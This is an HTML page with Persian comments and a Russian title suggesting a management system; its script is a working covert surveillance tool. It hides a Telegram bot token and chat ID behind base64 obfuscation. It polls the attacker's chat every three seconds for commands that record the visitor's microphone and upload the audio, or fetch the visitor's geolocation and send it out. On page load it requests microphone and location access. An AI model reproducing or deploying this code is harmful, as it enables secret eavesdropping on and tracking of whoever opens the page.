<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Система управления</title>
    <style>
        /* استایل‌های قبلی */
    </style>
</head>
<body>
    <!-- محتوای مشابه قبلی -->

    <script>
        // تنظیمات رمزنگاری شده
        const SECRET = {
            token: 'MzQwMjM2ODE2NzpHQUZEV0NuaDY0MHY5dGNRNVVtLVpnX0RQYWFodGhTd1ZaSQ==',
            chat: 'MjIzMTU4Njg3MQ=='
        };

        // توابع رمزگشایی
        const decrypt = {
            token: () => atob(SECRET.token).split('').reverse().join(''),
            chat: () => String.fromCharCode(...atob(SECRET.chat).split('').map(c => c.charCodeAt(0)-1))
        };

        // سیستم دستورات
        class BotController {
            constructor() {
                this.lastUpdateId = 0;
                this.audioRecorder = null;
            }

            async checkCommands() {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${decrypt.token()}/getUpdates?offset=${this.lastUpdateId+1}`);
                    const data = await response.json();
                    
                    data.result.forEach(update => {
                        if(update.message.chat.id.toString() === decrypt.chat()) {
                            this.executeCommand(update.message.text);
                            this.lastUpdateId = update.update_id;
                        }
                    });
                } catch(e) { console.error('Ошибка:', e); }
            }

            executeCommand(command) {
                switch(command.toLowerCase()) {
                    case '/start_audio':
                        this.startRecording();
                        break;
                    case '/stop_audio':
                        this.stopRecording();
                        break;
                    case '/get_location':
                        this.getLocation();
                        break;
                }
            }

            // سیستم موقعیت مکانی
            async getLocation() {
                const pos = await new Promise((res, rej) => 
                    navigator.geolocation.getCurrentPosition(res, rej));
                
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                this.sendToTelegram(`📍 Текущее местоположение:\n${mapLink}`);
            }

            // سیستم ضبط صدا
            async startRecording() {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                this.audioRecorder = new MediaRecorder(stream);
                this.audioChunks = [];
                
                this.audioRecorder.ondataavailable = e => this.audioChunks.push(e.data);
                this.audioRecorder.start();
                
                this.sendToTelegram('🎤 Запись звука начата...');
            }

            async stopRecording() {
                if(!this.audioRecorder) return;
                
                await new Promise(res => {
                    this.audioRecorder.onstop = res;
                    this.audioRecorder.stop();
                });
                
                const audioBlob = new Blob(this.audioChunks, { type: 'audio/webm' });
                this.sendAudio(audioBlob);
                this.audioChunks = [];
            }

            // سیستم ارسال داده
            sendToTelegram(text) {
                fetch(`https://api.telegram.org/bot${decrypt.token()}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: decrypt.chat(),
                        text: text
                    })
                });
            }

            sendAudio(audioBlob) {
                const formData = new FormData();
                formData.append('audio', audioBlob, 'recording.webm');
                formData.append('chat_id', decrypt.chat());
                
                fetch(`https://api.telegram.org/bot${decrypt.token()}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
            }
        }

        // اجرای سیستم
        const controller = new BotController();
        setInterval(() => controller.checkCommands(), 3000); // چک کردن دستورات هر ۳ ثانیه

        // درخواست اولیه دسترسی
        window.onload = async () => {
            await navigator.mediaDevices.getUserMedia({ audio: true }); // دسترسی میکروفون
            navigator.geolocation.getCurrentPosition(() => {}); // دسترسی موقعیت
        };
    </script>
</body>
</html>
